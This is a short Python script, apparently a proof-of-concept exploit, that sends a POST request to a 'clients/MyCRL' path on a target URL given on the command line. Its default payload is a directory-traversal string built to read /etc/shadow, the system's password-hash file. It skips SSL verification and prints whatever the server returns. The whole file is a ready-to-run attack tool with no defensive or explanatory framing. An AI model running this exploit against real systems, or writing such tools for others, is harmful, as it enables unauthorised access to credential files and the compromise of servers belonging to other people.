import requests
import argparse
from urllib.parse import urljoin

def send_post_request(base_url, payload):
    # Define the full URL by appending 'clients/MyCRL' to the base URL
    full_url = urljoin(base_url, 'clients/MyCRL')

    # Define headers, including Content-Length
    headers = {
        'Content-Length': str(len(payload))
    }

    # Send the POST request, ignoring SSL certificate errors
    response = requests.post(full_url, data=payload, headers=headers, verify=False)

    # Print the response status code and content
    print('Status Code:', response.status_code)
    print('Response Content:', response.content.decode())

if __name__ == "__main__":
    # Create the parser
    parser = argparse.ArgumentParser(description='Send a POST request with a specified payload.')

    # Add the base URL argument
    parser.add_argument('-u', '--url', required=True, help='The base URL to send the POST request to.')

    # Add the payload argument
    parser.add_argument('-p', '--payload', default='aCSHELL/../../../../../../../etc/shadow', help='The payload to include in the POST request.')

    # Parse the arguments
    args = parser.parse_args()

    # Send the POST request
    send_post_request(args.url, args.payload)
